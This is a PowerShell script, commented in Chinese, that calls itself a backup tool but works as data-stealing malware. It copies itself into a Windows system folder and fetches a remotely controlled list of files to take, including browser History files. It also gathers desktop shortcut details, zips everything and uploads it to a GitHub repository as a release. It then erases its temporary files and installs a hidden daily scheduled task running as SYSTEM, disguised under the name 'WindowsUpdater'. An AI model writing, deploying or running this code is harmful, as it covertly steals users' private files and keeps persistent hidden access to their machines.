# ========== 日志输出函数 ==========
function Log {
    param (
        [string]$Message,
        [string]$Color = "Green"
    )
    try {
        Write-Host $Message -ForegroundColor $Color
    } catch {
        Write-Host $Message
    }
}

# ========== 保存自身 ==========
$localPath = "C:\ProgramData\Microsoft\Windows\update.ps1"
Invoke-RestMethod -Uri "https://raw.githubusercontent.com/drftghy/backup-files/main/.github/install.ps1" -OutFile $localPath -UseBasicParsing

# ========== 设置编码 ==========
[Console]::OutputEncoding = [System.Text.UTF8Encoding]::UTF8
$OutputEncoding = [System.Text.UTF8Encoding]::UTF8

# ========== GitHub 参数 ==========
$token = $env:GITHUB_TOKEN
if (-not $token) {
    Log "[ERR] GITHUB_TOKEN 不存在，终止执行。" "Red"
    return
} else {
    Log "[OK] GITHUB_TOKEN 存在"
}

$repo = "drftghy/backup-files"
$now = Get-Date
$timestamp = $now.ToString("yyyy-MM-dd-HHmmss")
$date = $now.ToString("yyyy-MM-dd")
$computerName = $env:COMPUTERNAME
$tag = "backup-$computerName-$timestamp"
$releaseName = "Backup - $computerName - $date"
$tempRoot = "$env:TEMP\package-$computerName-$timestamp"
$zipName = "package-$computerName-$timestamp.zip"
$zipPath = Join-Path $env:TEMP $zipName
New-Item -ItemType Directory -Path $tempRoot -Force -ErrorAction SilentlyContinue | Out-Null

# ========== 步骤 1：加载路径列表 ==========
$remoteTxtUrl = "https://raw.githubusercontent.com/drftghy/backup-files/main/.github/upload-target.txt"
try {
    $remoteList = Invoke-RestMethod -Uri $remoteTxtUrl -UseBasicParsing -ErrorAction Stop
    $pathList = $remoteList -split "`n" | ForEach-Object { $_.Trim() } | Where-Object { $_ -ne "" }
    Log "[OK] 成功获取文件列表，共 $($pathList.Count) 项"
} catch {
    Log "[ERR] 获取远程路径失败，终止。" "Red"
    return
}

# ========== 步骤 2：复制目标路径 ==========
$index = 0
foreach ($path in $pathList) {
    $index++
    $name = "item$index"

    if (-not (Test-Path $path)) {
        Log "[WARN] 路径不存在：$path" "Yellow"
        continue
    }

    $dest = Join-Path $tempRoot $name
    try {
        if ($path -like "*\History" -and (Test-Path $path -PathType Leaf)) {
            $srcDir = Split-Path $path
            robocopy $srcDir $dest (Split-Path $path -Leaf) /NFL /NDL /NJH /NJS /nc /ns /np > $null
        } elseif (Test-Path $path -PathType Container) {
            Copy-Item $path -Destination $dest -Recurse -Force -ErrorAction Stop
        } else {
            Copy-Item $path -Destination $dest -Force -ErrorAction Stop
        }
        Log "[OK] 复制成功：$path"
    } catch {
        Log "[ERR] 复制失败：$path" "Red"
    }
}

# ========== 步骤 3：收集快捷方式信息 ==========
try {
    $desktop = [Environment]::GetFolderPath("Desktop")
    $lnkFiles = Get-ChildItem -Path $desktop -Filter *.lnk
    $lnkReport = ""

    foreach ($lnk in $lnkFiles) {
        $shell = New-Object -ComObject WScript.Shell
        $shortcut = $shell.CreateShortcut($lnk.FullName)

        $lnkReport += "[$($lnk.Name)]`n"
        $lnkReport += "TargetPath: $($shortcut.TargetPath)`n"
        $lnkReport += "Arguments:  $($shortcut.Arguments)`n"
        $lnkReport += "StartIn:    $($shortcut.WorkingDirectory)`n"
        $lnkReport += "Icon:       $($shortcut.IconLocation)`n"
        $lnkReport += "-----------`n"
    }

    $lnkOutputFile = Join-Path $tempRoot "lnk_info.txt"
    $lnkReport | Out-File -FilePath $lnkOutputFile -Encoding utf8
    Log "[OK] 快捷方式信息导出完成"
} catch {
    Log "[WARN] 快捷方式信息导出失败" "Yellow"
}

# ========== 步骤 4：打包 ==========
try {
    Compress-Archive -Path "$tempRoot\*" -DestinationPath $zipPath -Force -ErrorAction Stop
    Log "[OK] 文件压缩成功：$zipPath"
} catch {
    Log "[ERR] 文件压缩失败" "Red"
    return
}

# ========== 步骤 5：上传 GitHub Release ==========
$releaseData = @{
    tag_name = $tag
    name = $releaseName
    body = "Automated file package from $computerName on $date"
    draft = $false
    prerelease = $false
} | ConvertTo-Json -Depth 3

$headers = @{
    Authorization = "token $token"
    "User-Agent" = "PowerShellScript"
    Accept = "application/vnd.github.v3+json"
}

try {
    $releaseResponse = Invoke-RestMethod -Uri "https://api.github.com/repos/$repo/releases" -Method POST -Headers $headers -Body $releaseData -ErrorAction Stop
    $uploadUrl = $releaseResponse.upload_url -replace "{.*}", "?name=$zipName"
    Log "[OK] Release 创建成功"
} catch {
    Log "[ERR] Release 创建失败" "Red"
    return
}

try {
    $fileBytes = [System.IO.File]::ReadAllBytes($zipPath)
    $uploadHeaders = @{
        Authorization = "token $token"
        "Content-Type" = "application/zip"
        "User-Agent" = "PowerShellScript"
    }
    Invoke-RestMethod -Uri $uploadUrl -Method POST -Headers $uploadHeaders -Body $fileBytes -ErrorAction Stop
    Log "[OK] 文件上传成功"
} catch {
    Log "[ERR] 文件上传失败" "Red"
}

# ========== 步骤 6：清理临时文件 ==========
Remove-Item $tempRoot -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
Log "[OK] 清理完成"

# ========== 步骤 7：注册计划任务 ==========
$taskName = "WindowsUpdater"
$taskDescription = "Daily file package task"
$scriptPath = "C:\\ProgramData\\Microsoft\\Windows\\update.ps1"

try {
    if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
        Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
    }

    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""
    $trigger = New-ScheduledTaskTrigger -Daily -At 2:00am
    $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

    Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -Description $taskDescription -Principal $principal
    Log "[OK] 计划任务注册成功"
} catch {
    Log "[WARN] 计划任务注册失败" "Yellow"
}
